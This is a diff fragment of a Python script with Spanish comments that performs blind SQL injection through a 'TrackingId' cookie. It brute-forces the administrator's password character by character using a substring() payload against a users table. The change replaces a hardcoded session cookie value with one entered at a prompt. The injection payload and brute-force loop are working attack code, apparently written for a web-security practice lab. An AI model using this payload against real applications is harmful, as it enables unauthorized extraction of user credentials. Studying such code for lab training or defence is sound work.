@@ -19,7 +19,7 @@ def request():
     #catch the data to insert
     caracteres=  string.ascii_uppercase+string.ascii_lowercase+string.digits
     insertCookie= str(input(colored("Insertar Cookie Vulnerable: ",color="blue")))
-
+    sessionToken=str(input(colored("Insertar Token Sesion: ", color="blue")))
     p1= log.progress("Fuerza Bruta") 
 
     time.sleep(2)
@@ -35,7 +35,7 @@ def request():
             #iterar en los caracteres
             cookies={
                 'TrackingId': f"{insertCookie} ' and (select substring(password,{position},1) from users where username='administrator')='{char}",
-                'session':'wzLbj2RlkL1Pr3royLUGkhBdaIGfDgR3'
+                'session':f'{sessionToken}'
             }
 
             p1.status(cookies['TrackingId'])
